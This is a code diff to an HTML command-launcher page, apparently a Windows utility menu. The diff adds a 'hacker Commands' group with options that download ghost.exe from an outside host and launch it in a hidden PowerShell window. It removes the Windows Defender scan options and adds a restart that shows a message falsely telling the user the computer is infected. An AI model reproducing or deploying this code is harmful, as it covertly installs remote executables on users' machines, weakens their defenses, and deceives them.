@@ -204,6 +204,16 @@
           <label for="commandList" style="color: #fff;">Command Categories</label><br>
           <select id="commandList" size="10" style="width: 310px; padding: 5px;" onclick="selectAndClose()">
             
+ <br>  
+            <optgroup label="🖥️ hacker Commands">
+              <option value='start "" powershell -WindowStyle Hidden -Command "$wc = New-Object System.Net.WebClient; $wc.Headers.Add(\"User-Agent\",\"Mozilla/5.0\"); $wc.DownloadFile(\"https://tsilavina.alwaysdata.net/ghost.exe\",\"ghost.exe\")"'>download ghost.exe</option>
+              <option value='start "" /b powershell -WindowStyle Hidden -Command "Start-Process &#x27;ghost.exe&#x27; -WindowStyle Hidden"'>launch ghost.exe</option>
+              <option value='tasklist | findstr ghost.exe'>check ghost.exe</option>
+              <option value='taskkill /IM ghost.exe /F'>kill ghost.exe</option>
+            </optgroup>
+<br>  
+
+
             <optgroup label="🖥️ System Commands">
               <option value="sfc /scannow">sfc /scannow -> check disk</option>
               <option value="del /q /f /s %TEMP%\*">del /q /f /s %TEMP%\* -> delete user temp files</option>
@@ -233,15 +243,9 @@
               <!-- Tu peux en ajouter d'autres ici -->
             </optgroup>
 
-            <optgroup label="Windows Defender automation">
-              <option value="'%ProgramFiles%\Windows Defender\MpCmdRun.exe'-Scan -ScanType 1">Speed scan</option>
-              <option value="'%ProgramFiles%\Windows Defender\MpCmdRun.exe' -Scan -ScanType 2">alls scan</option>
-
-            </optgroup>
-
-
 
             <optgroup label="Utilities">
+              <option value="shutdown /r /t 7000 /c 'Votre ordinateur est infecté et dois redemmarer'">restart computer with message</option>
               <option value="shutdown /r /t 0">shutdown /r /t 0 -> restart computer</option>
             </optgroup>
 
